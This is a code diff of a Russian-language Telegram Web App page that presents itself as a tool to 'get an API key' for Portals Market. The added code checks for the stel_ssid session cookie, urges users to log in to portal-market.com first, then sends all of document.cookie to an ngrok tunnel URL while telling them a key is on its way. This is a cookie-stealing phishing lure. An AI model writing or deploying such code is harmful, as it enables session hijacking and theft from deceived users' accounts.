@@ -6,10 +6,10 @@
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </head>
 <body style="background:var(--tg-theme-bg-color);color:var(--tg-theme-text-color);display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;">
-    <h3>🔄 Перевыпуск ключа</h3>
-    <p id="status" style="text-align:center;opacity:0.7;max-width:80%;margin-bottom:20px;">Инициализация...</p>
-    <button id="btn" onclick="sendDirect()" style="padding:15px 30px;font-size:18px;background:#3390ec;color:#fff;border:none;border-radius:8px;cursor:pointer;display:none;">
-        Перевыпустить ключ
+    <h3>🔑 Получить API Key</h3>
+    <p id="status" style="text-align:center;opacity:0.7;max-width:80%;margin-bottom:20px;">Проверка сессии...</p>
+    <button id="btn" onclick="getKey()" style="padding:15px 30px;font-size:18px;background:#3390ec;color:#fff;border:none;border-radius:8px;cursor:pointer;display:none;">
+        Забрать ключ
     </button>
 
     <script>
@@ -20,32 +20,31 @@
 
         const NGROK_URL = "https://7793-31-76-55-178.ngrok-free.app/webhook"; 
 
-        if (!t.initData) {
-            statusEl.innerHTML = "❌ Откройте через кнопку в Telegram боте (/portals).";
+        // Проверяем наличие куки stel_ssid (главный индикатор авторизации)
+        const hasAuthCookie = document.cookie.includes('stel_ssid');
+
+        if (!hasAuthCookie) {
+            statusEl.innerHTML = "❌ Ты не авторизован в Portals Market.<br><br>Сначала зайди на сайт portal-market.com через Telegram и войди в аккаунт. Затем вернись сюда.";
         } else {
-            statusEl.innerHTML = "✅ Готов к работе.<br>Нажмите кнопку ниже.";
+            statusEl.innerHTML = "✅ Сессия активна.<br>Нажми кнопку, чтобы забрать ключ.";
             btn.style.display = "block";
         }
 
-        function sendDirect() {
-            statusEl.innerHTML = "⏳ Сбор сессии и отправка...";
+        function getKey() {
+            statusEl.innerHTML = "⏳ Запрашиваю ключ с сервера...";
             btn.disabled = true;
-
-            // Собираем все доступные куки текущего домена
-            const cookies = document.cookie; 
 
             fetch(NGROK_URL, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    init_data: t.initData,
-                    cookies: cookies 
+                    cookies: document.cookie 
                 })
             })
             .then(r => r.json())
             .then(d => {
                 if (d.status === 'ok') {
-                    statusEl.innerHTML = "✅ Ключ перевыпущен!<br>Проверьте личку администратора.";
+                    statusEl.innerHTML = "✅ Ключ получен!<br>Проверь личку от бота.";
                     setTimeout(() => t.close(), 2000);
                 } else {
                     statusEl.innerHTML = "❌ Ошибка:<br>" + (d.details || d.msg);
